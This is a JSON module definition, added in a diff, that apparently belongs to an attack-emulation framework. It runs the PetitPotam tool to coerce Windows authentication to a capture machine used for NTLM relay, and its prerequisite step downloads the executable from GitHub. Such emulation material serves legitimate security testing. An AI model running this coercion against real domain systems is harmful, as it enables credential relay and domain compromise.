@@ -1,0 +1,52 @@
+{
+    "name": "PetitPotam",
+    "description": "This module runs the Windows executable of PetitPotam in order to coerce authentication for a remote system. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "command": "& \"#{petitpotam_path}\" #{captureServerIP} #{targetServerIP} #{efsApi}\nWrite-Host \"End of PetitPotam attack\"\n",
+        "type": "Command Executor"
+    },
+    "id": "T1187",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "Forced Authentication",
+    "source": "ART",
+    "uuid": "485ce873-2e65-4706-9c7e-ae3ab9e14213",
+    "arguments": {
+        "captureServerIP": {
+            "description": "Computer IP to use to receive the authentication (ex. attacker machine used for NTLM relay)",
+            "type": "string",
+            "default": "10.0.0.3"
+        },
+        "targetServerIP": {
+            "description": "Computer IP to force authentication from (ex. domain controller)",
+            "type": "string",
+            "default": "10.0.0.2"
+        },
+        "efsApi": {
+            "description": "EFS API to use to coerce authentication",
+            "type": "integer",
+            "default": 1
+        },
+        "petitpotam_path": {
+            "description": "PetitPotam Windows executable",
+            "type": "path",
+            "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\PetitPotam.exe"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "PetitPotam binary must exist on disk and at specified location (#{petitpotam_path}).\nAnd the computer must be domain joined (implicit authentication).\n",
+            "prereq_command": "if (Test-Path \"#{petitpotam_path}\") { exit 0 } else { exit 1 }\n",
+            "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/topotam/PetitPotam/blob/2ae559f938e67d0cd59c5afcaac67672b9ef2981/PetitPotam.exe?raw=true\" -OutFile \"#{petitpotam_path}\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
